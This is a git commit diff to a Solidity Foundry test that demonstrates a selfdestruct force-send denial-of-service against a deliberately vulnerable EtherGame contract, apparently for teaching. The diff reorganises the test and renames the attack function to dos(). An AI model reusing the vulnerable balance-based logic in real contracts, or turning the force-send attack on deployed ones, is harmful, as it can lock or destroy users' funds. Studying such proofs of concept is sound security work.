b781242f9828576581875f7a126e0b163581a9af
finn79426 <finn79426@gmail.com>
2022-07-22 15:56:26 +0800

    Selfdestruct.sol: Make newbie friendly

--- src/test/Selfdestruct.sol
+++ src/test/Selfdestruct.sol
@@ -16,33 +16,8 @@ Now no one can deposit and the winner cannot be set.
 */
 
 
-contract ContractTest is Test {
-        EtherGame EtherGameContract;
-        Attack AttackerContract;
-
-function testselfdestruct() public {
-
-    address alice = vm.addr(1);
-    address eve = vm.addr(2);
-    vm.deal(address(alice), 1 ether);   
-    vm.deal(address(eve), 1 ether); 
-    EtherGameContract = new EtherGame();
-    vm.prank(alice);    
-    EtherGameContract.deposit{value: 1 ether}();
-    vm.prank(eve);
-    EtherGameContract.deposit{value: 1 ether}();
-    AttackerContract = new Attack(EtherGameContract);
-    AttackerContract.attack{value: 5 ether}();
-
-    console.log("Balance of EtherGameContract:", address(EtherGameContract).balance);
-    console.log("Exploit completed, Game is over");
-    EtherGameContract.deposit{value: 1 ether}(); //This call will fial due to contract destroyd.
-    }
-    receive() payable external{}
-}
-
 contract EtherGame {
-    uint public targetAmount = 7 ether;
+    uint constant public targetAmount = 7 ether;
     address public winner;
 
     function deposit() public payable {
@@ -64,6 +39,47 @@ contract EtherGame {
     }
 }
 
+
+contract ContractTest is Test {
+    EtherGame EtherGameContract;
+    Attack AttackerContract;
+    address alice;
+    address eve;
+
+    function setUp() public {
+        EtherGameContract = new EtherGame();
+        alice = vm.addr(1);
+        eve = vm.addr(2);
+        vm.deal(address(alice), 1 ether);   
+        vm.deal(address(eve), 1 ether); 
+    }
+
+    function testFailSelfdestruct() public {
+        console.log("Alice balance", alice.balance);
+        console.log("Eve balance", eve.balance);
+
+        console.log("Alice deposit 1 Ether...");
+        vm.prank(alice);    
+        EtherGameContract.deposit{value: 1 ether}();
+
+        console.log("Eve deposit 1 Ether...");
+        vm.prank(eve);
+        EtherGameContract.deposit{value: 1 ether}();
+
+        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
+
+        console.log("Attack...");
+        AttackerContract = new Attack(EtherGameContract);
+        AttackerContract.dos{value: 5 ether}();
+
+        console.log("Balance of EtherGameContract", address(EtherGameContract).balance);
+        console.log("Exploit completed, Game is over");
+        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.
+    }
+}
+
+
+
 contract Attack {
     EtherGame etherGame;
 
@@ -71,7 +87,7 @@ contract Attack {
         etherGame = EtherGame(_etherGame);
     }
 
-    function attack() public payable {
+    function dos() public payable {
         // You can simply break the game by sending ether so that
         // the game balance >= 7 ether
 
